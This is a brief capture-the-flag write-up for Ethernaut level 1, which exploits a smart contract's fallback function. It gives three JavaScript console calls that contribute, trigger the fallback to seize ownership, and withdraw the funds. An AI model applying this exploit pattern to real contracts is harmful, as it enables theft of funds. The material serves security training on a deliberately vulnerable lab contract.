# Day 1 - Fallback

Abusing erroneous logic between contract functions and fallback function.

```js
await contract.contribute({ value: 1234 });
await contract.sendTransaction({ from: player, value: 1234 });
await contract.withdraw();
```

- [reference](https://hackernoon.com/ethernaut-lvl-1-walkthrough-how-to-abuse-the-fallback-function-118057b68b56)
